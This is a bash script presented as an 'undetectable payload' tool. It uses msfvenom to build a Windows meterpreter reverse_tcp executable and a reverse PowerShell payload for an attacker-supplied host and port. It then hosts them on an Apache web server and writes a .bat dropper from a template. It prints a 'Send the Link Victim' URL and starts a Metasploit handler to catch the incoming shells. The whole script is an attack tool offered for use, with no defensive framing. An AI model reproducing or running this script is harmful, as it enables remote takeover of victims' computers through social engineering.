#!/bin/bash
cat logo.txt
printf "

:                                                           \e[189m\e[1;99m@@@@@@  A FULL UNDETECTABLE PAYLOAD  @@@@@@@ \e[0m\n"
printf "                                                         ++++++++ V1.0 Created by ...... Ignite +++++++++++"



printf "                                                                                                                                                                                                                                                                                                                      \e[189m\e[1;99m WELCOME TO IGNITETCH FUD TOOL \e[0m\n"
sleep 10







printf " \e[189m\e[1;73m Enter the Port [Eg. 4444] \e[0m\n"
echo ""
read port
printf " \e[189m\e[1;73m Enter the Lhost \e[0m\n"
echo ""
read lhost
printf " \e[189m\e[1;73m Enter the Payload Name \e[0m\n"
echo ""
read name
printf "                                                                  \e[101m\e[1;73m WAIT PAYlOAD IS RUNNING \e[0m\n" 
msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhost lport=$port -f exe > $name.exe
printf " \e[189m\e[1;73m Enter the Backup Payload Name [Different] \e[0m\n"
echo ""
read backup
msfvenom -p cmd/windows/reverse_powershell lhost=$lhost lport=$port > $backup.sh
systemctl start apache2
systemctl restart apache2.service
mv /var/www/html/index.html /var/www/
mv $name.exe /var/www/html/
mv $backup.sh /var/www/html/
echo ""
printf " \e[210m\e[1;73m; Enter One More Diffrent Payload Name \e[0m\n"
echo ""
read payload
sed -e "s/\$ip/$lhost/" -e "s/\$name/$name/" -e "s/\$lhost/$lhost/" -e "s/\$backup/$backup/" requirements.txt > $payload.bat
sudo mv $payload.bat /var/www/html/
printf "                                                 \e[189m\e[1;99m       Send the Link Victim +++++ http://$lhost/$payload.bat \e[0m\n"
 
printf "                                                                                                                                                                                                                                                                                                                                                                                                                                      \e[101m\e[1;73m WAIT METASPLOIT RUNNING \e[0m\n"
sleep 10
sed -e "s/\$lhost/$lhost/" meterpreter.rc > $name.rc
msfconsole -r $name.rc






